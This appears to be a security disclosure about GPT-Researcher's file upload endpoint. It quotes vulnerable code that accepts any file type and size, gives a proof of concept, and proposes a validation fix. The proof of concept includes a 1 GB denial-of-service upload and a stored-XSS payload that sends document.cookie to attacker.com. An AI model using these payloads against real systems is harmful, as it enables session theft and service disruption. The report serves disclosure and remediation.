# GPT-Researcher File Upload Vulnerability Summary

## Issue

GPT-Researcher's file upload endpoint (`POST /upload/`) accepts arbitrary file types without validation or size limits, immediately processing uploaded documents through unstructured library without sandboxing, enabling DoS attacks, malware storage, and potential exploitation of document parsing vulnerabilities.

## Vulnerable Code

**Location**: `backend/server/server_utils.py:236-245`

```python
async def handle_file_upload(file, DOC_PATH: str) -> Dict[str, str]:
    file_path = os.path.join(DOC_PATH, os.path.basename(file.filename))
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)  # ← No validation, no size limit

    document_loader = DocumentLoader(DOC_PATH)  # ← Processes ALL files
    await document_loader.load()  # ← Immediate unsafe processing

    return {"filename": file.filename, "path": file_path}
```

## Proof of Concept

```bash
# 1. Upload arbitrary file type (shell script)
echo '#!/bin/bash\necho "malicious"' > malware.sh
curl -X POST -F "file=@malware.sh" http://localhost:8009/upload/
# Result: Accepted without validation

# 2. Upload large file (DoS)
dd if=/dev/zero of=huge.pdf bs=1M count=1000
curl -X POST -F "file=@huge.pdf" http://localhost:8009/upload/
# Result: Accepted, causes disk/memory exhaustion

# 3. Upload malicious HTML
cat > xss.html << 'EOF'
<script>fetch('http://attacker.com/steal?data='+document.cookie)</script>
EOF
curl -X POST -F "file=@xss.html" http://localhost:8009/upload/
# Result: Stored and parsed by BSHTMLLoader
```

## Execution Demo

> [Screenshot Placeholder - Upload Test]

![File Upload Test](./screenshots/upload_test.png)

> [Screenshot Placeholder - DoS Verification]

![DoS Attack](./screenshots/dos_test.png)

## Impact

| Issue | Severity | Exploitable |
|-------|----------|-------------|
| No file type validation | HIGH | ✅ Yes |
| No size limits | MEDIUM | ✅ Yes |
| Unsafe document processing | MEDIUM | ✅ Yes |
| **Overall** | **HIGH** | ✅ **Yes** |

## Mitigations Found

✅ XXE (XML External Entity) - Mitigated by XML parser
✅ SSRF - External HTTP entities not resolved
✅ Zip Slip - Python's zipfile sanitizes paths

## Recommended Fix

```python
# Add validation
ALLOWED_EXTENSIONS = {'.pdf', '.txt', '.docx', '.xlsx'}
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB

async def handle_file_upload_secure(file: UploadFile, DOC_PATH: str):
    # 1. Validate extension
    extension = Path(file.filename).suffix.lower()
    if extension not in ALLOWED_EXTENSIONS:
        raise HTTPException(400, f"File type not allowed: {extension}")

    # 2. Check size
    file.file.seek(0, 2)
    size = file.file.tell()
    file.file.seek(0)
    if size > MAX_FILE_SIZE:
        raise HTTPException(400, f"File too large: {size} bytes")

    # 3. Verify MIME type
    content = file.file.read(2048)
    file.file.seek(0)
    mime = magic.from_buffer(content, mime=True)
    if mime not in ALLOWED_MIME_TYPES:
        raise HTTPException(400, f"Invalid MIME type: {mime}")

    # 4. Process with timeout
    await asyncio.wait_for(document_loader.load(), timeout=60.0)
```

## Files

- **Full Analysis**: `FINAL_VULNERABILITY_REPORT.md`
- **Assessment**: `VULNERABILITY_ASSESSMENT.md`
- **Proposed Fix**: `proposed_fix_server_utils.py`

---

**Status**: ✅ Confirmed Exploitable
**Date**: 2025-11-11
**Severity**: HIGH
